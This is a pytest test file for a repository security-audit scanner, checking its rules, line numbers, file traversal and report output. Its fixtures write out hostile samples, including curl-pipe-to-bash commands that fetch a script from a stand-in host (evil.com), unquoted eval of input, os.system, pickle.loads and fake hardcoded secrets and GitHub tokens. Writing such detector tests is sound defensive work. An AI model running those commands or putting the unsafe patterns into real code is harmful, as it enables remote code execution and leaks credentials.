"""Tests for scripts/audit-security.py — security pattern scanning."""

import importlib.util
import io
import sys
from pathlib import Path
from unittest.mock import patch

import pytest

SCRIPTS_DIR = Path(__file__).resolve().parent.parent / "scripts"
sys.path.insert(0, str(SCRIPTS_DIR))

spec = importlib.util.spec_from_file_location(
    "audit_security", str(SCRIPTS_DIR / "audit-security.py")
)
mod = importlib.util.module_from_spec(spec)
spec.loader.exec_module(mod)

scan_file = mod.scan_file
audit_all = mod.audit_all
print_report = mod.print_report


class TestScanFile:
    def test_pipe_curl_bash_critical(self, tmp_path, monkeypatch):
        monkeypatch.setattr(mod, "REPO", tmp_path)
        f = tmp_path / "install.sh"
        f.write_text("curl https://evil.com/script.sh | bash\n", encoding="utf-8")
        findings = scan_file(f, mod.SHELL_PATTERNS)
        assert len(findings) == 1
        assert findings[0]["rule"] == "pipe_curl_bash"
        assert findings[0]["severity"] == "CRITICAL"

    def test_eval_high(self, tmp_path, monkeypatch):
        monkeypatch.setattr(mod, "REPO", tmp_path)
        f = tmp_path / "run.sh"
        f.write_text("eval $USER_INPUT\n", encoding="utf-8")
        findings = scan_file(f, mod.SHELL_PATTERNS)
        assert len(findings) == 1
        assert findings[0]["rule"] == "unquoted_variable_in_eval"

    def test_os_system_critical(self, tmp_path, monkeypatch):
        monkeypatch.setattr(mod, "REPO", tmp_path)
        f = tmp_path / "unsafe.py"
        f.write_text('os.system(f"curl {url}")\n', encoding="utf-8")
        findings = scan_file(f, mod.PYTHON_PATTERNS)
        assert any(r["rule"] == "os_system_input" and r["severity"] == "CRITICAL"
                   for r in findings)

    def test_hardcoded_secret_high(self, tmp_path, monkeypatch):
        monkeypatch.setattr(mod, "REPO", tmp_path)
        f = tmp_path / "config.py"
        f.write_text('password = "super_secret_password_123"\n', encoding="utf-8")
        findings = scan_file(f, mod.PYTHON_PATTERNS)
        assert any(r["rule"] == "hardcoded_secret" for r in findings)

    def test_pickle_high(self, tmp_path, monkeypatch):
        monkeypatch.setattr(mod, "REPO", tmp_path)
        f = tmp_path / "loader.py"
        f.write_text("data = pickle.loads(b64)\n", encoding="utf-8")
        findings = scan_file(f, mod.PYTHON_PATTERNS)
        assert any(r["rule"] == "pickle_loads" for r in findings)

    def test_github_token_critical(self, tmp_path, monkeypatch):
        monkeypatch.setattr(mod, "REPO", tmp_path)
        f = tmp_path / ".env"
        f.write_text("GITHUB_TOKEN=ghp_abcdefghijklmnopqrstuvwxyz1234567890\n", encoding="utf-8")
        findings = scan_file(f, mod.CONFIG_PATTERNS)
        assert any(r["rule"] == "github_token" for r in findings)

    def test_line_number_accurate(self, tmp_path, monkeypatch):
        monkeypatch.setattr(mod, "REPO", tmp_path)
        f = tmp_path / "script.sh"
        f.write_text("#!/bin/bash\n\ncurl https://x.com | bash\n", encoding="utf-8")
        findings = scan_file(f, mod.SHELL_PATTERNS)
        assert findings[0]["line"] == 3

    def test_binary_file_skipped(self, tmp_path, monkeypatch):
        monkeypatch.setattr(mod, "REPO", tmp_path)
        f = tmp_path / "data.bin"
        f.write_bytes(b"\x00\x01\x02\x80\xfe\xff")
        findings = scan_file(f, mod.PYTHON_PATTERNS)
        assert findings == []

    def test_clean_file_no_findings(self, tmp_path, monkeypatch):
        monkeypatch.setattr(mod, "REPO", tmp_path)
        f = tmp_path / "safe.py"
        f.write_text("x = 1\ny = x + 1\n", encoding="utf-8")
        findings = scan_file(f, mod.PYTHON_PATTERNS)
        assert findings == []


class TestAuditAll:
    def test_scans_python_files(self, tmp_path, monkeypatch):
        monkeypatch.setattr(mod, "REPO", tmp_path)
        scripts = tmp_path / "scripts"
        scripts.mkdir()
        (scripts / "test.py").write_text('password = "secret123456"\n', encoding="utf-8")
        findings = audit_all()
        assert any(f["rule"] == "hardcoded_secret" for f in findings)

    def test_skips_pycache(self, tmp_path, monkeypatch):
        monkeypatch.setattr(mod, "REPO", tmp_path)
        scripts = tmp_path / "scripts" / "__pycache__"
        scripts.mkdir(parents=True)
        (scripts / "cache.py").write_text("pass\n", encoding="utf-8")
        findings = audit_all()
        assert not any("__pycache__" in f["file"] for f in findings)

    def test_scans_dotenv(self, tmp_path, monkeypatch):
        monkeypatch.setattr(mod, "REPO", tmp_path)
        (tmp_path / ".env").write_text("GH_TOKEN=ghp_" + "a" * 36 + "\n", encoding="utf-8")
        findings = audit_all()
        assert any(f["rule"] == "github_token" for f in findings)

    def test_scans_shell_files(self, tmp_path, monkeypatch):
        monkeypatch.setattr(mod, "REPO", tmp_path)
        scripts = tmp_path / "scripts"
        scripts.mkdir()
        (scripts / "deploy.sh").write_text("curl evil.com/script | bash\n", encoding="utf-8")
        findings = audit_all()
        assert any(f["rule"] == "pipe_curl_bash" for f in findings)


class TestPrintReport:
    def test_no_findings(self):
        out = io.StringIO()
        with patch.object(sys, "stdout", out):
            count = print_report([])
        assert count == 0
        assert "No security issues found" in out.getvalue()

    def test_returns_critical_high_count(self):
        findings = [
            {"file": "x.py", "line": 1, "severity": "CRITICAL", "rule": "r1",
             "desc": "d1", "match": "m1"},
            {"file": "x.py", "line": 2, "severity": "HIGH", "rule": "r2",
             "desc": "d2", "match": "m2"},
            {"file": "x.py", "line": 3, "severity": "LOW", "rule": "r3",
             "desc": "d3", "match": "m3"},
        ]
        out = io.StringIO()
        with patch.object(sys, "stdout", out):
            count = print_report(findings)
        assert count == 2


class TestMain:
    def test_json_output(self, monkeypatch):
        monkeypatch.setattr(mod, "audit_all", lambda: [])
        out = io.StringIO()
        with patch.object(sys, "argv", ["audit-security.py", "--json"]), \
             patch.object(sys, "stdout", out):
            mod.main()
        assert '"findings"' in out.getvalue()

    def test_check_exits_nonzero(self, monkeypatch):
        findings = [{"file": "x.sh", "line": 1, "severity": "CRITICAL",
                     "rule": "r1", "desc": "d1", "match": "m1"}]
        monkeypatch.setattr(mod, "audit_all", lambda: findings)
        with patch.object(sys, "argv", ["audit-security.py", "--check"]):
            with pytest.raises(SystemExit) as exc:
                mod.main()
            assert exc.value.code == 1
